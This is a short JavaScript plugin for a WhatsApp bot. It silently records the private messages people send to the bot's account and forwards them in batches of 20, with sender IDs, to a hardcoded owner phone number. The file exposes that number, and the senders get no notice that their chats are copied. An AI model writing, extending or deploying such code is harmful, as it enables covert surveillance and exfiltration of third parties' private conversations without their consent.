const fs = require('fs');
const path = require('path');
const STATUS_PATH = './fitur/.forwardstatus.json';
const COUNTER_PATH = path.join(__dirname, '.counter.json');
const OWNER_NUMBER = '6282121588338@s.whatsapp.net';

module.exports = async (sock, msg) => {
    if (!msg.message) return;

    // Cek status aktif
    if (fs.existsSync(STATUS_PATH)) {
        const { aktif } = JSON.parse(fs.readFileSync(STATUS_PATH));
        if (!aktif) return;
    }

    const from = msg.key.remoteJid;
    if (from.endsWith('@g.us')) return;

    const pesan = msg.message;
    const jenis = Object.keys(pesan)[0];
    const body =
        pesan?.conversation ||
        pesan?.extendedTextMessage?.text ||
        pesan?.imageMessage?.caption ||
        pesan?.videoMessage?.caption ||
        pesan?.documentMessage?.caption ||
        `[${jenis}]`;

    if (!fs.existsSync(COUNTER_PATH)) {
        fs.writeFileSync(COUNTER_PATH, JSON.stringify({ count: 0, chatLog: [] }, null, 2));
    }

    let data = JSON.parse(fs.readFileSync(COUNTER_PATH));
    data.chatLog.push({ from, body });
    data.count++;

    if (data.count >= 20) {
        let teks = '🧾 *Halo bos*, ini 20 chat terakhir dari orang-orang (chat pribadi).\n\n';
        teks += data.chatLog.map((item, i) =>
            `${i + 1}. Dari: ${item.from}\nPesan: ${item.body}`
        ).join('\n\n');

        await sock.sendMessage(OWNER_NUMBER, { text: teks });
        data.count = 0;
        data.chatLog = [];
    }

    fs.writeFileSync(COUNTER_PATH, JSON.stringify(data, null, 2));
};
